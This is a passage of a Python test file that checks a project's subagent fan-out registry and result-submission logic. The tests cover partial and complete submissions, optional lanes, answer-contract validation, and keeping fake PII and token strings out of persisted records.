"""Generic interview fan-out core + ``ouroboros_submit_fanout_results`` re-entry.

Covers PR-J:
- ``build_fanout_subagents`` generic builder,
- ``stamp_fanout_meta`` 3-mode stamping (byte-identical to the legacy inline
  producers),
- ``FanoutRegistry`` persist/load,
- ``submit_fanout_results`` routing (complete / partial / unknown / mismatch),
- end-to-end producer -> registry -> submit for both revived synthesizer kinds.
"""

from __future__ import annotations

from collections.abc import Mapping
import json
import os
from typing import Any

import pytest

from ouroboros.backends.capabilities import SubagentDispatchMode
from ouroboros.mcp.tools.authoring_handlers import (
    InterviewHandler,
    _attach_question_assist_requests,
)
from ouroboros.mcp.tools.evaluation_handlers import (
    LateralThinkHandler,
    SubmitFanoutResultsHandler,
)
from ouroboros.mcp.tools.subagent import (
    FANOUT_KIND_CODE_INVESTIGATION,
    FANOUT_KIND_LATERAL_PERSONA_PANEL,
    FANOUT_KIND_QUESTION_ADVISORY,
    FanoutRecord,
    FanoutRegistry,
    RecordWrite,
    build_fanout_subagents,
    build_interview_question_advisory_subagents,
    build_subagent_payload,
    canonical_data_lane_contract,
    register_code_investigation_fanout,
    register_lateral_persona_fanout,
    register_question_advisory_fanout,
    register_question_advisory_fanout_from_lanes,
    stamp_fanout_meta,
    submit_fanout_results,
)
from ouroboros.orchestrator.capabilities import (
    stable_code_investigation_question_identity,
)
from ouroboros.orchestrator.capabilities.interview_schemas import (
    _interview_question_advisory_fanout_metadata,
)

# --------------------------------------------------------------------------- #
# build_fanout_subagents
# --------------------------------------------------------------------------- #


def test_build_fanout_subagents_builds_one_payload_per_request() -> None:
    requests = [
        {"tool_name": "t", "title": "A", "prompt": "pa", "agent": "researcher"},
        {"tool_name": "t", "title": "B", "prompt": "pb", "context": {"lane_id": "code"}},
    ]
    payloads = build_fanout_subagents(requests, "context.lane_id")
    assert [p.title for p in payloads] == ["A", "B"]
    assert payloads[0].agent == "researcher"
    assert payloads[1].agent == "general"
    assert payloads[1].context == {"lane_id": "code"}


def test_build_fanout_subagents_rejects_empty_inputs() -> None:
    with pytest.raises(ValueError, match="requests must not be empty"):
        build_fanout_subagents([], "context.lane_id")
    with pytest.raises(ValueError, match="correlation_key must not be empty"):
        build_fanout_subagents([{"tool_name": "t", "title": "x", "prompt": "y"}], "")


# --------------------------------------------------------------------------- #
# stamp_fanout_meta (byte-identical 3-mode contract)
# --------------------------------------------------------------------------- #


def _payloads(n: int = 2) -> list[Any]:
    return [build_subagent_payload(tool_name="t", title=f"T{i}", prompt=f"p{i}") for i in range(n)]


def test_stamp_fanout_meta_host_driven_prefixed() -> None:
    meta: dict[str, Any] = {}
    stamp_fanout_meta(
        meta,
        prefix="question_advisory",
        dispatch_mode=SubagentDispatchMode.HOST_DRIVEN,
        payloads=_payloads(),
        correlation_key="context.lane_id",
    )
    assert meta == {
        "question_advisory_dispatch_mode": "host_driven",
        "question_advisory_host_action": "spawn_subagents",
        "question_advisory_result_correlation_key": "context.lane_id",
    }


def test_stamp_fanout_meta_sequential_bare() -> None:
    meta: dict[str, Any] = {}
    stamp_fanout_meta(
        meta,
        prefix="",
        dispatch_mode=SubagentDispatchMode.SEQUENTIAL,
        payloads=_payloads(),
        correlation_key="context.persona",
    )
    assert meta == {
        "dispatch_mode": "sequential",
        "host_action": "process_payloads_sequentially",
        "result_correlation_key": "context.persona",
    }


def test_stamp_fanout_meta_plugin_passive_stamps_nothing() -> None:
    meta: dict[str, Any] = {}
    stamp_fanout_meta(
        meta,
        prefix="question_advisory",
        dispatch_mode=SubagentDispatchMode.PLUGIN_PASSIVE,
        payloads=_payloads(),
        correlation_key="context.lane_id",
    )
    assert meta == {}


def test_stamp_fanout_meta_empty_payloads_is_noop() -> None:
    meta: dict[str, Any] = {}
    stamp_fanout_meta(
        meta,
        prefix="",
        dispatch_mode=SubagentDispatchMode.HOST_DRIVEN,
        payloads=[],
        correlation_key="context.persona",
    )
    assert meta == {}


# --------------------------------------------------------------------------- #
# Byte-identical proof for the refactored advisory producer
# --------------------------------------------------------------------------- #


def _advisory_meta(dispatch_mode: SubagentDispatchMode, **kwargs: Any) -> dict[str, Any]:
    meta: dict[str, Any] = {}
    _attach_question_assist_requests(
        meta,
        session_id="sess-bytes",
        question="What constraint remains?",
        phase="answer",
        score=None,
        dispatch_mode=dispatch_mode,
        runtime_backend="codex" if dispatch_mode is SubagentDispatchMode.HOST_DRIVEN else "gemini",
        **kwargs,
    )
    return meta


def test_advisory_producer_byte_identical_without_registry() -> None:
    """No registry -> emitted fan-out meta is the exact pre-registry contract."""
    host = _advisory_meta(SubagentDispatchMode.HOST_DRIVEN)
    assert host["question_advisory_contract_id"] == "interview_question_advisory_fanout.v1"
    assert host["question_advisory_dispatch_mode"] == "host_driven"
    assert host["question_advisory_host_action"] == "spawn_subagents"
    assert host["question_advisory_result_correlation_key"] == "context.lane_id"
    assert "question_advisory_fanout_id" not in host

    seq = _advisory_meta(SubagentDispatchMode.SEQUENTIAL)
    assert seq["question_advisory_contract_id"] == "interview_question_advisory_fanout.v1"
    assert seq["question_advisory_dispatch_mode"] == "sequential"
    assert seq["question_advisory_host_action"] == "process_payloads_sequentially"
    assert seq["question_advisory_result_correlation_key"] == "context.lane_id"
    assert "question_advisory_fanout_id" not in seq


def test_advisory_registry_delta_is_exactly_fanout_id(tmp_path: Any) -> None:
    """Adding a registry adds exactly one key: question_advisory_fanout_id."""
    without = _advisory_meta(SubagentDispatchMode.HOST_DRIVEN)
    registry = FanoutRegistry(tmp_path)
    with_registry = _advisory_meta(SubagentDispatchMode.HOST_DRIVEN, fanout_registry=registry)
    added = set(with_registry) - set(without)
    assert added == {"question_advisory_fanout_id"}
    # Every shared key is byte-identical.
    for key in without:
        assert with_registry[key] == without[key]


# --------------------------------------------------------------------------- #
# FanoutRegistry
# --------------------------------------------------------------------------- #


def test_registry_register_and_load_round_trip(tmp_path: Any) -> None:
    registry = FanoutRegistry(tmp_path)
    fanout_id = registry.register(
        kind=FANOUT_KIND_LATERAL_PERSONA_PANEL,
        session_id="s1",
        correlation_key="context.persona",
        expected_keys=["researcher", "contrarian"],
        synthesizer_input={"entries": [{"persona_id": "researcher", "execution_order": 1}]},
    )
    assert fanout_id.startswith("fanout_")
    loaded = registry.load(fanout_id)
    assert isinstance(loaded, FanoutRecord)
    assert loaded.kind == FANOUT_KIND_LATERAL_PERSONA_PANEL
    assert loaded.expected_keys == ("researcher", "contrarian")


def test_registry_load_unknown_returns_none(tmp_path: Any) -> None:
    assert FanoutRegistry(tmp_path).load("nope") is None


# --------------------------------------------------------------------------- #
# submit_fanout_results routing
# --------------------------------------------------------------------------- #


def test_submit_unknown_fanout_id_is_clean_error(tmp_path: Any) -> None:
    out = submit_fanout_results(
        FanoutRegistry(tmp_path),
        session_id="s",
        correlation_key="context.persona",
        results=[],
        fanout_id="ghost",
    )
    assert out["status"] == "unknown_fanout_id"
    # The id is digested rather than echoed (round-69): an unknown id is by
    # definition one the registry never issued, so it is caller text heading
    # for host logs, and the grammar admits credential-shaped values.
    assert "ghost" not in out["error"]
    assert out["fanout_id"].startswith("<redacted-key sha256:")


def test_submit_partial_lists_missing_keys(tmp_path: Any) -> None:
    registry = FanoutRegistry(tmp_path)
    payloads = [
        build_subagent_payload(
            tool_name="ouroboros_lateral_think",
            title=f"L ({p})",
            prompt="x",
            agent=p,
            context={"persona": p},
        )
        for p in ("researcher", "contrarian", "simplifier")
    ]
    fanout_id = register_lateral_persona_fanout(registry, session_id="s1", payloads=payloads)
    out = submit_fanout_results(
        registry,
        session_id="s1",
        correlation_key="context.persona",
        results=[{"key": "researcher", "content": "found facts"}],
        fanout_id=fanout_id,
    )
    assert out["status"] == "partial"
    assert out["missing_keys"] == ["contrarian", "simplifier"]
    assert out["received_keys"] == ["researcher"]


def test_submit_correlation_mismatch(tmp_path: Any) -> None:
    registry = FanoutRegistry(tmp_path)
    payloads = [
        build_subagent_payload(
            tool_name="ouroboros_lateral_think",
            title="L (researcher)",
            prompt="x",
            agent="researcher",
            context={"persona": "researcher"},
        )
    ]
    fanout_id = register_lateral_persona_fanout(registry, session_id="s1", payloads=payloads)
    out = submit_fanout_results(
        registry,
        session_id="s1",
        correlation_key="context.lane_id",  # wrong key
        results=[{"key": "researcher", "content": "x"}],
        fanout_id=fanout_id,
    )
    assert out["status"] == "correlation_mismatch"


def test_submit_complete_lateral_panel_routes_to_synthesizer(tmp_path: Any) -> None:
    registry = FanoutRegistry(tmp_path)
    personas = ("researcher", "contrarian", "simplifier")
    payloads = [
        build_subagent_payload(
            tool_name="ouroboros_lateral_think",
            title=f"L ({p})",
            prompt="x",
            agent=p,
            context={"persona": p},
        )
        for p in personas
    ]
    fanout_id = register_lateral_persona_fanout(registry, session_id="s1", payloads=payloads)
    out = submit_fanout_results(
        registry,
        session_id="s1",
        correlation_key="context.persona",
        results=[{"key": p, "content": f"{p}-output"} for p in personas],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete"
    assert out["kind"] == FANOUT_KIND_LATERAL_PERSONA_PANEL
    result = out["result"]
    # continue_interview_after_lateral_persona_synthesis was exercised.
    assert result["ready_for_synthesis"] is True
    assert result["continued_interview"] is True
    assert result["interview_continuation"]["ready_to_continue"] is True
    agg = result["synthesis"]["aggregated_outputs"]
    assert [item["persona_id"] for item in agg] == list(personas)


def _code_fact_output(session_id: str, question: str) -> dict[str, Any]:
    return {
        "session_id": session_id,
        "question_identity": stable_code_investigation_question_identity(question),
        "answer_prefix": "[from-code][auto-confirmed]",
        "answer_text": "pyproject.toml declares the package metadata.",
        "confidence": "high_exact_match",
        "evidence": [
            {
                "source": "pyproject.toml",
                "locator": "project.name",
                "claim": "The package name is declared in pyproject.toml.",
            }
        ],
        "requires_user_confirmation": False,
    }


def test_submit_complete_code_investigation_routes_to_synthesizer(tmp_path: Any) -> None:
    # The advisory producer no longer registers a code-investigation record
    # (#1578 follow-up: it registered `code_facts` while stamping
    # `context.lane_id`, so contract-following hosts were rejected). The
    # code-investigation kind is now registered directly from its request.
    registry = FanoutRegistry(tmp_path)
    question = "Which manifest declares the package?"
    session_id = "sess-code"
    meta: dict[str, Any] = {}
    _attach_question_assist_requests(
        meta,
        session_id=session_id,
        question=question,
        phase="answer",
        score=None,
        dispatch_mode=SubagentDispatchMode.HOST_DRIVEN,
        runtime_backend="codex",
    )
    fanout_id = register_code_investigation_fanout(
        registry,
        session_id=session_id,
        request=meta["code_investigation_request"],
    )
    out = submit_fanout_results(
        registry,
        session_id=session_id,
        correlation_key="code_facts",
        results=[{"key": "code_facts", "content": _code_fact_output(session_id, question)}],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete"
    assert out["kind"] == FANOUT_KIND_CODE_INVESTIGATION
    result = out["result"]
    assert result["ready_for_synthesis"] is True
    assert result["ready_for_forward"] is True
    assert result["contract_violations"] == []


# --------------------------------------------------------------------------- #
# Advisory re-entry regression (#1578 follow-up): the STAMPED contract works
# --------------------------------------------------------------------------- #


def _resolve_correlated_key(payload: Mapping[str, Any], dotted_key: str) -> str:
    """Resolve a payload's correlation value by walking the stamped dotted path."""
    node: Any = payload
    for part in dotted_key.split("."):
        assert isinstance(node, Mapping), f"cannot traverse {dotted_key!r} at {part!r}"
        node = node[part]
    return str(node)


def _emitted_advisory_contract(
    registry: FanoutRegistry, session_id: str
) -> tuple[str, str, list[str]]:
    """Emit an advisory response and read the re-entry contract FROM its meta.

    Returns ``(fanout_id, correlation_key, lane_keys)`` exactly as a
    contract-following host would obtain them: the stamped fan-out id, the
    stamped correlation key, and the per-lane keys resolved by walking that
    dotted key against each emitted advisory payload.
    """
    meta: dict[str, Any] = {}
    _attach_question_assist_requests(
        meta,
        session_id=session_id,
        question="Which rollout strategy should we pick?",
        phase="answer",
        score=None,
        dispatch_mode=SubagentDispatchMode.HOST_DRIVEN,
        runtime_backend="codex",
        fanout_registry=registry,
    )
    fanout_id = meta["question_advisory_fanout_id"]
    correlation_key = meta["question_advisory_result_correlation_key"]
    lane_keys = [
        _resolve_correlated_key(payload, correlation_key)
        for payload in meta["question_advisory_subagents"]
    ]
    assert lane_keys, "advisory fan-out emitted no lanes"
    return fanout_id, correlation_key, lane_keys


@pytest.mark.asyncio
async def test_advisory_reentry_follows_stamped_meta_contract(tmp_path: Any) -> None:
    """Regression (#1578): a host following the STAMPED contract must succeed.

    The producer stamped ``question_advisory_result_correlation_key=
    "context.lane_id"`` but registered a ``code_facts`` code-investigation
    record, so submitting with the stamped key + per-lane keys was rejected
    with ``correlation_mismatch``. Everything submitted here is read from the
    emitted meta/payloads — nothing is hardcoded from server internals.
    """
    registry = FanoutRegistry(tmp_path)
    session_id = "sess-advisory-contract"
    fanout_id, correlation_key, lane_keys = _emitted_advisory_contract(registry, session_id)

    # data_context carries an answer contract, so its submitted output must be
    # contract-conforming JSON (free-text lanes keep plain string outputs).
    def _lane_content(key: str) -> Any:
        if key == "data_context":
            return {
                "lane_id": "data_context",
                "data_needed": False,
                "finding": "No data evidence is needed for this question.",
                "confidence": "no_evidence",
                "evidence": [],
                "proposed_queries": [],
                "requires_user_confirmation": True,
            }
        return f"{key}-advice"

    submit = SubmitFanoutResultsHandler(fanout_registry=registry)
    submit_result = await submit.handle(
        {
            "session_id": session_id,
            "fanout_id": fanout_id,
            "correlation_key": correlation_key,
            "results": [{"key": key, "content": _lane_content(key)} for key in lane_keys],
        }
    )
    assert submit_result.is_ok, submit_result
    out = submit_result.unwrap().meta
    assert out["status"] == "complete"
    assert out["kind"] == FANOUT_KIND_QUESTION_ADVISORY
    assert out["correlation_key"] == correlation_key
    assert out["contract_violations"] == []
    aggregated = out["result"]["aggregated_outputs"]
    assert [item["lane_id"] for item in aggregated] == lane_keys
    assert [item["output"] for item in aggregated] == [_lane_content(key) for key in lane_keys]


@pytest.mark.asyncio
async def test_advisory_reentry_partial_set_lists_missing_lane_ids(tmp_path: Any) -> None:
    """Submitting a subset of the emitted lanes reports the missing lane ids."""
    registry = FanoutRegistry(tmp_path)
    session_id = "sess-advisory-partial"
    fanout_id, correlation_key, lane_keys = _emitted_advisory_contract(registry, session_id)
    assert len(lane_keys) > 1, "partial-set case needs multiple advisory lanes"

    submit = SubmitFanoutResultsHandler(fanout_registry=registry)
    submit_result = await submit.handle(
        {
            "session_id": session_id,
            "fanout_id": fanout_id,
            "correlation_key": correlation_key,
            "results": [{"key": lane_keys[0], "content": f"{lane_keys[0]}-advice"}],
        }
    )
    assert submit_result.is_ok, submit_result
    out = submit_result.unwrap().meta
    assert out["status"] == "partial"
    assert out["missing_keys"] == lane_keys[1:]
    assert out["received_keys"] == [lane_keys[0]]


# --------------------------------------------------------------------------- #
# Optional-lane completion semantics (Q00/ouroboros#1671)
# --------------------------------------------------------------------------- #


def _mixed_advisory_payloads() -> list[Any]:
    """Advisory payloads with one optional data lane and two required lanes."""
    request = {
        "session_id": "sess-optional-lanes",
        "question_identity": "interview-question:0123456789abcdef",
        "question": "Which plan tier do most active users hit?",
        "user_question_first": True,
        "lanes": [
            {
                "lane_id": "data_context",
                "capability": "call_mcp",
                "purpose": "Fetch data evidence.",
                "required": False,
                "data_policy": {"read_only": True, "aggregate_only": True},
            },
            {
                "lane_id": "ambiguity_contrarian",
                "capability": "run_lateral_review",
                "persona": "contrarian",
                "purpose": "Find hidden assumptions.",
                "required": True,
            },
            {
                "lane_id": "answer_simplifier",
                "capability": "run_lateral_review",
                "persona": "simplifier",
                "purpose": "Make it easy to answer.",
                "required": True,
            },
        ],
    }
    return build_interview_question_advisory_subagents(request)


def test_register_question_advisory_fanout_records_required_subset(tmp_path: Any) -> None:
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-optional-lanes",
        payloads=_mixed_advisory_payloads(),
    )
    record = registry.load(fanout_id)
    assert record is not None
    assert record.expected_keys == ("data_context", "ambiguity_contrarian", "answer_simplifier")
    assert record.required_keys == ("ambiguity_contrarian", "answer_simplifier")


def test_advisory_completes_when_only_optional_lanes_missing(tmp_path: Any) -> None:
    """A host that cannot run an optional lane must not pin the fan-out.

    Before #1671 every emitted lane was an expected completion key, so a
    runtime without MCP access that skipped ``data_context`` was stuck at
    ``status="partial"`` forever.
    """
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-optional-lanes",
        payloads=_mixed_advisory_payloads(),
    )
    out = submit_fanout_results(
        registry,
        session_id="sess-optional-lanes",
        correlation_key="context.lane_id",
        results=[
            {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
            {"key": "answer_simplifier", "content": "simplifier-advice"},
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete"
    assert out["missing_optional_keys"] == ["data_context"]
    aggregated = out["result"]["aggregated_outputs"]
    assert [item["lane_id"] for item in aggregated] == [
        "ambiguity_contrarian",
        "answer_simplifier",
    ]


def test_advisory_submitted_optional_lane_still_aggregates(tmp_path: Any) -> None:
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-optional-lanes",
        payloads=_mixed_advisory_payloads(),
    )
    out = submit_fanout_results(
        registry,
        session_id="sess-optional-lanes",
        correlation_key="context.lane_id",
        results=[
            # Structured, because the data lane is bound to its contract by
            # identity even with no declaration (round-67). This used to submit
            # the bare string "data-evidence", which only aggregated because
            # the lane registered with nothing bound.
            {
                "key": "data_context",
                "content": {
                    "lane_id": "data_context",
                    "data_needed": False,
                    "finding": "This question does not depend on data evidence.",
                    "confidence": "no_evidence",
                    "evidence": [],
                    "proposed_queries": [],
                    "requires_user_confirmation": True,
                },
            },
            {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
            {"key": "answer_simplifier", "content": "simplifier-advice"},
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete"
    assert out["missing_optional_keys"] == []
    aggregated = out["result"]["aggregated_outputs"]
    assert [item["lane_id"] for item in aggregated] == [
        "data_context",
        "ambiguity_contrarian",
        "answer_simplifier",
    ]


def test_advisory_missing_required_lane_is_still_partial(tmp_path: Any) -> None:
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-optional-lanes",
        payloads=_mixed_advisory_payloads(),
    )
    out = submit_fanout_results(
        registry,
        session_id="sess-optional-lanes",
        correlation_key="context.lane_id",
        results=[{"key": "ambiguity_contrarian", "content": "contrarian-advice"}],
        fanout_id=fanout_id,
    )
    assert out["status"] == "partial"
    assert out["missing_required_keys"] == ["answer_simplifier"]
    # missing_keys keeps listing every missing lane (backward-compatible).
    assert out["missing_keys"] == ["data_context", "answer_simplifier"]


def test_partial_submissions_accumulate_across_calls(tmp_path: Any) -> None:
    """Submit required lane A, then only the remaining lane B -> complete.

    Each call used to rebuild the provided set from that request alone, so the
    documented "resubmit the remaining lanes" retry contract could never
    complete. Received results now persist on the record between calls.
    """
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-optional-lanes",
        payloads=_mixed_advisory_payloads(),
    )
    first = submit_fanout_results(
        registry,
        session_id="sess-optional-lanes",
        correlation_key="context.lane_id",
        results=[{"key": "ambiguity_contrarian", "content": "contrarian-advice"}],
        fanout_id=fanout_id,
    )
    assert first["status"] == "partial"
    assert first["missing_required_keys"] == ["answer_simplifier"]

    second = submit_fanout_results(
        registry,
        session_id="sess-optional-lanes",
        correlation_key="context.lane_id",
        results=[{"key": "answer_simplifier", "content": "simplifier-advice"}],
        fanout_id=fanout_id,
    )
    assert second["status"] == "complete"
    aggregated = second["result"]["aggregated_outputs"]
    assert [item["lane_id"] for item in aggregated] == [
        "ambiguity_contrarian",
        "answer_simplifier",
    ]
    assert aggregated[0]["output"] == "contrarian-advice"


def test_data_lane_output_is_validated_against_answer_contract(tmp_path: Any) -> None:
    """A contract-violating data_context output must not flow to synthesis.

    Bot-review probe (PR #1703): raw PII-shaped evidence with
    ``requires_user_confirmation=false`` previously aggregated as-is under
    ``status="complete"``. The lane's answer contract is persisted at
    registration and enforced at re-entry: violations surface under
    ``contract_violations`` and the violating lane is excluded from the
    aggregation.
    """
    registry = FanoutRegistry(tmp_path)
    request = {
        "session_id": "sess-contract",
        "question_identity": "interview-question:0123456789abcdef",
        "question": "Which plan tier do most active users hit?",
        "user_question_first": True,
        "lanes": _interview_question_advisory_fanout_metadata()["lanes"],
    }
    payloads = build_interview_question_advisory_subagents(request)
    fanout_id = register_question_advisory_fanout(
        registry, session_id="sess-contract", payloads=payloads
    )

    violating_data_output = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "user rows follow",
        "confidence": "reported_by_tool",
        "evidence": [],  # reported_by_tool without executed evidence
        "proposed_queries": [],
        "requires_user_confirmation": False,  # contract forbids skipping the user
        "raw_rows": ["alice@example.com", "bob@example.com"],
    }
    out = submit_fanout_results(
        registry,
        session_id="sess-contract",
        correlation_key="context.lane_id",
        results=[
            {"key": "data_context", "content": violating_data_output},
            {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
            {"key": "answer_simplifier", "content": "simplifier-advice"},
        ],
        fanout_id=fanout_id,
    )

    assert out["status"] == "complete"
    violations = out["contract_violations"]
    assert [item["lane_id"] for item in violations] == ["data_context"]
    assert violations[0]["contract_id"] == "data_evidence_answer.v1"
    assert violations[0]["errors"]
    aggregated_lanes = [item["lane_id"] for item in out["result"]["aggregated_outputs"]]
    assert "data_context" not in aggregated_lanes


def test_contract_conforming_data_lane_output_aggregates(tmp_path: Any) -> None:
    registry = FanoutRegistry(tmp_path)
    request = {
        "session_id": "sess-contract-ok",
        "question_identity": "interview-question:0123456789abcdef",
        "question": "Which plan tier do most active users hit?",
        "user_question_first": True,
        "lanes": _interview_question_advisory_fanout_metadata()["lanes"],
    }
    payloads = build_interview_question_advisory_subagents(request)
    fanout_id = register_question_advisory_fanout(
        registry, session_id="sess-contract-ok", payloads=payloads
    )

    conforming = {
        "lane_id": "data_context",
        "data_needed": False,
        "finding": "No data evidence is needed for this question.",
        "confidence": "no_evidence",
        "evidence": [],
        "proposed_queries": [],
        "requires_user_confirmation": True,
    }
    out = submit_fanout_results(
        registry,
        session_id="sess-contract-ok",
        correlation_key="context.lane_id",
        results=[
            {"key": "data_context", "content": conforming},
            {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
            {"key": "answer_simplifier", "content": "simplifier-advice"},
        ],
        fanout_id=fanout_id,
    )

    assert out["status"] == "complete"
    assert out["contract_violations"] == []
    aggregated_lanes = [item["lane_id"] for item in out["result"]["aggregated_outputs"]]
    assert "data_context" in aggregated_lanes


def test_violating_lane_output_is_rejected_before_persistence(tmp_path: Any) -> None:
    """A contract-violating partial submission must never reach durable state.

    Bot-review round-2 probe (PR #1703): raw rows, an email, and a token were
    serialized into ``received_results`` because validation only ran at
    completion. Validation now happens at the door: the violating output is
    reported and excluded, and the persisted record never contains it.
    """
    registry = FanoutRegistry(tmp_path)
    request = {
        "session_id": "sess-door",
        "question_identity": "interview-question:0123456789abcdef",
        "question": "Which plan tier do most active users hit?",
        "user_question_first": True,
        "lanes": _interview_question_advisory_fanout_metadata()["lanes"],
    }
    payloads = build_interview_question_advisory_subagents(request)
    fanout_id = register_question_advisory_fanout(
        registry, session_id="sess-door", payloads=payloads
    )

    pii_output = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "user rows follow",
        "confidence": "reported_by_tool",
        "evidence": [],
        "proposed_queries": [],
        "requires_user_confirmation": False,
        "raw_rows": ["alice@example.com", "token=sk-live-123"],
    }
    out = submit_fanout_results(
        registry,
        session_id="sess-door",
        correlation_key="context.lane_id",
        results=[{"key": "data_context", "content": pii_output}],
        fanout_id=fanout_id,
    )

    assert out["status"] == "partial"
    assert [item["lane_id"] for item in out["contract_violations"]] == ["data_context"]
    assert "data_context" not in out["received_keys"]
    persisted = (tmp_path / f"{fanout_id}.json").read_text()
    assert "alice@example.com" not in persisted
    assert "sk-live-123" not in persisted


def test_completed_fanout_is_terminal(tmp_path: Any) -> None:
    """Replaying a completed fan-out cannot mutate the synthesized outcome."""
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-terminal",
        payloads=_mixed_advisory_payloads(),
    )
    results = [
        {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
        {"key": "answer_simplifier", "content": "simplifier-advice"},
    ]
    first = submit_fanout_results(
        registry,
        session_id="sess-terminal",
        correlation_key="context.lane_id",
        results=results,
        fanout_id=fanout_id,
    )
    assert first["status"] == "complete"

    replay = submit_fanout_results(
        registry,
        session_id="sess-terminal",
        correlation_key="context.lane_id",
        results=[{"key": "ambiguity_contrarian", "content": "MUTATED"}],
        fanout_id=fanout_id,
    )
    assert replay["status"] == "already_complete"
    record = registry.load(fanout_id)
    assert record is not None
    assert record.completed is True
    assert record.received_results["ambiguity_contrarian"] == "contrarian-advice"


def test_partial_reports_failed_accumulation_persistence(tmp_path: Any) -> None:
    """A lost state write must not masquerade as an accepted submission."""
    from unittest.mock import patch

    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-io-fail",
        payloads=_mixed_advisory_payloads(),
    )
    with patch.object(
        FanoutRegistry, "save", return_value=RecordWrite(written=False, durable=False)
    ):
        out = submit_fanout_results(
            registry,
            session_id="sess-io-fail",
            correlation_key="context.lane_id",
            results=[{"key": "ambiguity_contrarian", "content": "contrarian-advice"}],
            fanout_id=fanout_id,
        )
    assert out["status"] == "partial"
    assert out["accumulation_persisted"] is False


def test_unexpected_key_is_rejected_before_persistence(tmp_path: Any) -> None:
    """A key absent from ``expected_keys`` never enters durable state.

    Bot-review round-3 probe (PR #1703): arbitrary email/token content
    submitted under an unregistered key was accepted and persisted with no
    violation. Unknown keys are now rejected at the door and reported under
    ``unexpected_keys``.
    """
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-unexpected",
        payloads=_mixed_advisory_payloads(),
    )
    out = submit_fanout_results(
        registry,
        session_id="sess-unexpected",
        correlation_key="context.lane_id",
        results=[
            {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
            {"key": "answer_simplifier", "content": "simplifier-advice"},
            {"key": "unexpected", "content": "carol@example.com token=sk-live-999"},
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete"
    assert out["unexpected_keys"] == ["unexpected"]
    aggregated = [item["lane_id"] for item in out["result"]["aggregated_outputs"]]
    assert "unexpected" not in aggregated
    persisted = (tmp_path / f"{fanout_id}.json").read_text()
    assert "carol@example.com" not in persisted
    assert "sk-live-999" not in persisted


def test_code_investigation_wrong_session_does_not_terminalize(tmp_path: Any) -> None:
    """Synthesis readiness gates terminalization, not key presence.

    Bot-review round-3 probe (PR #1703): a ``code_facts`` output bound to a
    different session returned outer ``status="complete"`` while its result
    said ``ready_for_synthesis=false``, then the record was permanently
    terminal and the corrected retry bounced off ``already_complete``. The
    rejected content is now reported as ``synthesis_rejected_keys``, never
    persisted, and the record stays open for the corrected retry.
    """
    registry = FanoutRegistry(tmp_path)
    question = "Which manifest declares the package?"
    session_id = "sess-code-readiness"
    meta: dict[str, Any] = {}
    _attach_question_assist_requests(
        meta,
        session_id=session_id,
        question=question,
        phase="answer",
        score=None,
        dispatch_mode=SubagentDispatchMode.HOST_DRIVEN,
        runtime_backend="codex",
    )
    fanout_id = register_code_investigation_fanout(
        registry,
        session_id=session_id,
        request=meta["code_investigation_request"],
    )
    wrong = submit_fanout_results(
        registry,
        session_id=session_id,
        correlation_key="code_facts",
        results=[
            {"key": "code_facts", "content": _code_fact_output("some-other-session", question)}
        ],
        fanout_id=fanout_id,
    )
    assert wrong["status"] == "partial"
    # Since round-20 the kind-specific rejection happens BEFORE the first
    # durable write (early partial branch), so no synthesis result rides the
    # response — the rejected key and reopened requirement are the signal.
    assert wrong["synthesis_rejected_keys"] == ["code_facts"]
    assert wrong["missing_required_keys"] == ["code_facts"]
    record = registry.load(fanout_id)
    assert record is not None
    assert record.completed is False
    assert "code_facts" not in record.received_results

    corrected = submit_fanout_results(
        registry,
        session_id=session_id,
        correlation_key="code_facts",
        results=[{"key": "code_facts", "content": _code_fact_output(session_id, question)}],
        fanout_id=fanout_id,
    )
    assert corrected["status"] == "complete"
    assert corrected["result"]["ready_for_synthesis"] is True


def test_completion_is_not_claimed_when_terminal_write_fails(tmp_path: Any) -> None:
    """A failed terminal write must never masquerade as durable completion.

    Bot-review round-3 probe (PR #1703): with ``save()`` returning ``False``
    the call still reported ``complete``, and a later submission could replace
    the outcome. The response is now ``completion_not_persisted``, the record
    stays open, and a retry completes durably.
    """
    from unittest.mock import patch

    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-terminal-io",
        payloads=_mixed_advisory_payloads(),
    )
    results = [
        {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
        {"key": "answer_simplifier", "content": "simplifier-advice"},
    ]
    with patch.object(
        FanoutRegistry, "save", return_value=RecordWrite(written=False, durable=False)
    ):
        out = submit_fanout_results(
            registry,
            session_id="sess-terminal-io",
            correlation_key="context.lane_id",
            results=results,
            fanout_id=fanout_id,
        )
    assert out["status"] == "completion_not_persisted"
    assert out["result"]["aggregated_outputs"]
    record = registry.load(fanout_id)
    assert record is not None
    assert record.completed is False

    retry = submit_fanout_results(
        registry,
        session_id="sess-terminal-io",
        correlation_key="context.lane_id",
        results=results,
        fanout_id=fanout_id,
    )
    assert retry["status"] == "complete"
    record = registry.load(fanout_id)
    assert record is not None
    assert record.completed is True


def test_replay_returns_persisted_terminal_outcome(tmp_path: Any) -> None:
    """A caller that lost the completion response can recover the synthesis.

    Bot-review round-3 probe (PR #1703): replaying a completed fan-out
